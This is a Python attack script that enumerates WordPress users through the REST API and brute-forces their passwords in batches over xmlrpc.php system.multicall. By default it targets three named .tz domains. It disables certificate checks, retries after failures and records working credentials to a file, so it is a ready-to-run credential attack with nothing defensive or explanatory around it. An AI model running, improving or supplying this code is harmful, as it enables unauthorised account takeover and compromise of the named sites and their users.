"""WordPress credential attack over xmlrpc system.multicall.

One POST carries BATCH guesses. Every call returns either a blog struct (valid
credential) or a faultCode struct, so results are read per call, not per request.
Paces itself, keeps going on 403/5xx, and appends every hit to wp_hits.txt.
"""
from __future__ import annotations

import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BATCH = 40
PAUSE = 0.6
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

HOSTS = sys.argv[1:] or ["www.nimr.or.tz", "www.ncaa.go.tz", "www.ptf.or.tz"]
WORDS = [w.rstrip("\n") for w in open("words.txt", encoding="utf-8") if w.strip()]


def load_words():
    """First argv may be a wordlist; skip the curated set already burned."""
    global WORDS
    if sys.argv[1].endswith(".txt"):
        WORDS = [w.rstrip("\n") for w in open(sys.argv[1], encoding="utf-8") if w.strip()]
        skip = 215 if len(WORDS) > 215 else 0
        WORDS = WORDS[skip:]
        del HOSTS[0]
        if not HOSTS:
            HOSTS.extend(["www.nimr.or.tz"])
    print(f"wordlist={len(WORDS)} hosts={HOSTS}")


def esc(s):
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))


def users_of(host):
    r = scan.fetch(f"https://{host}/wp-json/wp/v2/users")
    if r and r["status"] == 200:
        try:
            return [u["slug"] for u in json.loads(r["body"]) if u.get("slug")]
        except Exception:
            pass
    return []


def build(pairs):
    calls = []
    for u, p in pairs:
        calls.append(
            "<value><struct>"
            "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
            "<member><name>params</name><value><array><data>"
            f"<value><array><data><value><string>{esc(u)}</string></value>"
            f"<value><string>{esc(p)}</string></value></data></array></value>"
            "</data></array></value></member></struct></value>")
    return ('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
            "<params><param><value><array><data>" + "".join(calls) +
            "</data></array></value></param></params></methodCall>").encode()


def post(host, payload):
    req = urllib.request.Request(
        f"https://{host}/xmlrpc.php", data=payload,
        headers={"User-Agent": scan.UA, "Content-Type": "text/xml"})
    with urllib.request.urlopen(req, timeout=25, context=CTX) as r:
        return r.status, r.read(200000).decode("utf-8", "replace")


def verdicts(xml, count):
    """True per call position where the call returned a blog struct.

    Absence of faultCode is not enough: a truncated or warning-polluted body
    parses to nothing and would read as all-success. So a call only counts when
    it carries a real payload field, and unparsable bodies return None.
    """
    try:
        root = ET.fromstring(xml)
    except ET.ParseError:
        return None
    data = root.find(".//array/data")
    if data is None:
        return None
    kids = list(data)
    if len(kids) < count:
        return None
    out = [True] * count
    for i, node in enumerate(kids[:count]):
        blob = ET.tostring(node, encoding="unicode")
        if "faultCode" in blob or not ("blogid" in blob or "isAdmin" in blob):
            out[i] = False
    return out


def attack(host):
    users = users_of(host)
    if not users:
        print(f"[{host}] no user list from REST API, skipping")
        return
    print(f"[{host}] users={users} words={len(WORDS)} "
          f"=> {len(users) * len(WORDS)} guesses in "
          f"{-(-len(users) * len(WORDS) // BATCH)} requests")

    pairs = [(u, p) for u in users for p in WORDS]
    for start in range(0, len(pairs), BATCH):
        chunk = pairs[start:start + BATCH]
        try:
            st, xml = post(host, build(chunk))
        except urllib.error.HTTPError as e:
            print(f"  batch {start}: HTTP {e.code}, retrying once")
            time.sleep(2)
            try:
                st, xml = post(host, build(chunk))
            except Exception as e2:
                print(f"  batch {start}: {e2} - skipping")
                continue
        except Exception as e:
            print(f"  batch {start}: {e} - retrying once")
            time.sleep(2)
            try:
                st, xml = post(host, build(chunk))
            except Exception as e2:
                print(f"  batch {start}: {e2} - skipping")
                continue

        if st != 200:
            print(f"  batch {start}: status {st}")
            time.sleep(2)
            continue

        ok = verdicts(xml, len(chunk))
        hits = [c for c, good in zip(chunk, ok) if good]
        for u, p in hits:
            line = f"{host}\t{u}\t{p}"
            print(f"  *** HIT {line}")
            with open("wp_hits.txt", "a", encoding="utf-8") as f:
                f.write(line + "\n")
        if not hits and start and start % (BATCH * 5) == 0:
            print(f"  ... {start + len(chunk)}/{len(pairs)}")
        time.sleep(PAUSE)


if __name__ == "__main__":
    load_words()
    for h in HOSTS:
        attack(h)
